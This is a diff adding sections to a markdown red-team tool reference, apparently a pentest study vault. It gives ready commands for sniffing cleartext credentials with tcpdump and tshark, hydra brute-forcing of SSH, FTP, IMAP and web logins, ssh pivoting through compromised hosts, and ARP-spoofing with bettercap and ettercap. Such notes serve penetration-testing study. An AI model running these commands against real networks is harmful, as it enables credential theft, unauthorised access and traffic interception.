@@ -17,12 +17,13 @@ The working kit for offensive operations. Every tool documented here follows the
 
 | Phase | Tools |
 |-------|-------|
-| Reconnaissance | nmap, masscan, amass, subfinder, theHarvester, shodan, whatweb, dnsx, wafw00f, nuclei |
-| Web Exploitation | gobuster, ffuf, burpsuite, sqlmap, feroxbuster, wfuzz, nikto |
+| Reconnaissance & Sniffing | [[Red/Instruments/nmap\|nmap]], masscan, amass, subfinder, theHarvester, shodan, whatweb, dnsx, wafw00f, nuclei, [[Red/Instruments/tcpdump\|tcpdump]], [[Red/Instruments/wireshark\|wireshark / tshark]] |
+| Web Exploitation | [[Red/Instruments/gobuster\|gobuster]], [[Red/Instruments/ffuf\|ffuf]], [[Red/Instruments/burpsuite\|burpsuite]], [[Red/Instruments/sqlmap\|sqlmap]], feroxbuster, wfuzz, nikto |
 | Exploitation | metasploit, searchsploit, pwntools |
-| Credential Access | hydra, hashcat, john, netexec, mimikatz, secretsdump, responder |
-| Privilege Escalation | linpeas, winpeas, pspy, powerup, les, wesng, bloodhound |
-| Post-Exploitation | netcat, socat, chisel, ligolo-ng, evil-winrm, impacket |
+| Adversary-in-the-Middle | [[Red/Instruments/bettercap\|bettercap / ettercap]], [[Red/Instruments/responder\|responder]] |
+| Credential Access | [[Red/Instruments/hydra\|hydra]], [[Red/Instruments/hashcat\|hashcat]], john, [[Red/Instruments/netexec\|netexec]], mimikatz, secretsdump, [[Red/Instruments/responder\|responder]] |
+| Privilege Escalation | [[Red/Instruments/linpeas\|linpeas / winpeas]], pspy, powerup, les, wesng, bloodhound |
+| Post-Exploitation & Pivoting | netcat, socat, [[Red/Instruments/chisel\|chisel]], ligolo-ng, evil-winrm, impacket, [[Red/Instruments/ssh\|ssh / scp / sftp]] |
 
 ---
 
@@ -81,6 +82,85 @@ nmap ... -oG out.gnmap # greppable
 | `-Pn` | Skip host discovery (skip ping) |
 | `-n` | No DNS resolution |
 | `--open` | Show only open ports |
+
+---
+
+## 🦈 tcpdump
+
+**Purpose:** Command-line packet sniffer and network traffic analyzer for credential harvesting and network inspection.
+
+```bash
+# Capture packets on a specific interface displaying contents in ASCII
+sudo tcpdump -i eth0 -A
+
+# Sniff cleartext credentials on common legacy ports (POP3, Telnet, HTTP, FTP)
+sudo tcpdump port 110 -A          # POP3 credentials
+sudo tcpdump port 23 -A           # Telnet cleartext session
+sudo tcpdump port 21 -A           # FTP USER / PASS
+sudo tcpdump port 80 -A           # HTTP headers, POST logins
+
+# Capture traffic to or from a specific host
+sudo tcpdump host 10.10.10.50 -A
+
+# Capture traffic on a specific subnet
+sudo tcpdump net 192.168.1.0/24 -n
+
+# Output packets in Hex and ASCII
+sudo tcpdump -XX port 21
+
+# Write captured packets to a PCAP file
+sudo tcpdump -i eth0 -w /tmp/capture.pcap port 80 or port 21
+
+# Read and dissect a previously saved PCAP file
+tcpdump -r capture.pcap -A
+tcpdump -r capture.pcap -qns 0 -X
+
+# Useful filtering combinations (BPF syntax)
+sudo tcpdump -i any 'tcp[tcpflags] & (tcp-syn) != 0'   # Capture only SYN packets
+sudo tcpdump -n -s 0 -c 1000 -w scan.pcap             # First 1000 full packets
+```
+
+**Key Flags:**
+
+| Flag | Meaning |
+|------|---------|
+| `-i <iface>` | Capture on interface (e.g. `eth0`, `any`) |
+| `-A` | Print packet payload in ASCII (indispensable for cleartext passwords) |
+| `-X` / `-XX` | Print payload in hex and ASCII (including link header with `-XX`) |
+| `-w <file>` | Write raw packets to PCAP file |
+| `-r <file>` | Read raw packets from PCAP file |
+| `-n` | Do not resolve IP addresses to hostnames |
+| `-nn` | Do not resolve hostnames or port names |
+| `-v` / `-vv` | Verbose packet decoding |
+| `-s 0` | Set snapshot length to maximum (capture entire packet) |
+| `-c <count>` | Stop after capturing specified number of packets |
+
+---
+
+## 🦈 Wireshark / tshark (Offensive Sniffing)
+
+**Purpose:** Packet analysis and credential extraction via GUI (`wireshark`) or CLI (`tshark`).
+
+```bash
+# CLI live capture of cleartext protocol data with tshark
+tshark -i eth0 -f "port 110" -Y "pop" -T fields -e text
+
+# Extract HTTP POST credentials from a PCAP file
+tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data
+
+# Dump all unique DNS queries from capture
+tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort -u
+
+# Extract cleartext credentials across multiple protocols
+tshark -r capture.pcap -Y "ftp.request.command == USER or ftp.request.command == PASS"
+```
+
+**Essential Display Filters for Credential Harvesting:**
+- `pop` or `imap` — Email authentication and message exchange
+- `telnet` — Unencrypted terminal sessions
+- `ftp` — Cleartext FTP commands and file listings
+- `http.authbasic` or `http.request.method == "POST"` — Web logins
+- `data-text-lines contains "password"` — Raw strings containing passwords
 
 ---
 
@@ -203,6 +283,51 @@ sqlmap -u "..." --level=5 --risk=3 --batch
 # Using a saved request from Burp
 sqlmap -r request.txt --batch
 ```
+
+---
+
+## 🔑 hydra
+
+**Purpose:** Fast, multi-threaded network logon cracker supporting 50+ protocols (SSH, FTP, HTTP, IMAP, SMB, etc.).
+
+```bash
+# Attack SSH service with a single user and wordlist
+hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.10.50 ssh
+
+# Attack FTP with username and password lists
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.50 ftp
+
+# Attack IMAP service (e.g. mail accounts)
+hydra -l lazie -P /usr/share/wordlists/rockyou.txt 10.10.10.50 imap
+
+# Attack non-standard port with custom speed/threads
+hydra -l admin -P passwords.txt -s 2222 -t 16 10.10.10.50 ssh
+
+# Stop after finding the first valid pair (-f) and show attempts (-vV)
+hydra -l mark -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.10.50 ssh
+
+# HTTP POST form brute-forcing
+hydra -l admin -P passwords.txt 10.10.10.50 http-post-form \
+  "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
+
+# HTTP Basic Auth
+hydra -l admin -P passwords.txt 10.10.10.50 http-get /admin/
+```
+
+**Key Flags:**
+
+| Flag | Meaning |
+|------|---------|
+| `-l <user>` | Single username to test |
+| `-L <file>` | Wordlist of usernames |
+| `-p <pass>` | Single password to test |
+| `-P <file>` | Wordlist of passwords |
+| `-s <port>` | Non-default service port |
+| `-t <threads>` | Parallel connection tasks (default 16, lower for stable SSH e.g. 4) |
+| `-f` | Exit immediately when a valid login is found |
+| `-v` / `-V` / `-vV` | Verbose / show login+password for each attempt |
+| `-w <wait>` | Wait time between requests (rate limiting evasion) |
+| `-o <file>` | Output found credentials to file |
 
 ---
 
@@ -365,6 +490,82 @@ proxychains nmap -sT <internal_ip>
 proxychains evil-winrm -i <internal_ip> -u <user> -p <pass>
 proxychains firefox   # browse internal web services
 ```
+
+---
+
+## 🔐 ssh / scp / sftp
+
+**Purpose:** Encrypted remote command execution, port forwarding, secure file staging, and SOCKS proxying.
+
+```bash
+# Basic authenticated interactive shell
+ssh mark@10.10.10.50
+
+# Connect on custom port with private key
+ssh -p 2222 -i ~/.ssh/id_ed25519 mark@10.10.10.50
+
+# Execute non-interactive command directly on remote host
+ssh mark@10.10.10.50 "uname -r; id; cat /etc/os-release"
+
+# Key Generation (Ed25519 recommended)
+ssh-keygen -t ed25519 -C "operator@mindpalace"
+
+# Copy public key to remote host for persistent, passwordless access
+ssh-copy-id -i ~/.ssh/id_ed25519.pub mark@10.10.10.50
+
+# Local Port Forwarding: access remote internal port 80 through local port 8080
+ssh -L 8080:localhost:80 mark@10.10.10.50
+
+# Dynamic SOCKS5 Proxy (Pivot through compromised target)
+ssh -D 9050 -N -f mark@10.10.10.50
+# (-D: dynamic port, -N: do not execute remote command, -f: send to background)
+
+# Jump Host / Bastion routing
+ssh -J jumpuser@bastion.corp.local mark@internal.corp.local
+
+# SCP: Secure file transfer (remote to local)
+scp mark@10.10.10.50:/home/mark/evidence.txt ./evidence.txt
+
+# SCP: Secure file transfer (local to remote)
+scp -P 2222 linpeas.sh mark@10.10.10.50:/tmp/linpeas.sh
+
+# SFTP: Interactive file transfer
+sftp mark@10.10.10.50
+```
+
+---
+
+## ⚡ bettercap / ettercap
+
+**Purpose:** Layer 2 / Layer 3 Adversary-in-the-Middle (MITM) attacks, ARP spoofing, DNS spoofing, and rogue gateway positioning.
+
+```bash
+# Bettercap interactive session on specific interface
+sudo bettercap -iface eth0
+
+# Bettercap eval command (run and execute one-liner)
+sudo bettercap -iface eth0 -eval "net.probe on; net.show"
+
+# Bettercap automated caplet script
+sudo bettercap -iface eth0 -caplet spoof.cap
+
+# Common Bettercap internal commands:
+net.probe on                       # Discover live hosts via mDNS/NetBIOS/ARP
+net.show                           # Display LAN host cache
+set arp.spoof.targets 10.10.10.50  # Define victim target IP
+set arp.spoof.internal true        # Spoof both target and gateway
+arp.spoof on                       # Start ARP cache poisoning
+net.sniff on                       # Sniff intercepted packets
+
+# Ettercap Text-mode ARP poisoning
+sudo ettercap -T -q -i eth0 -M arp:remote /10.10.10.1// /10.10.10.50//
+# (-T: Text mode, -q: quiet, -M arp: MITM ARP mode)
+```
+
+**Ettercap Interface Options:**
+- `-T` — Text-only CLI
+- `-C` — Ncurses terminal GUI
+- `-G` — Full GTK graphical interface
 
 ---
 
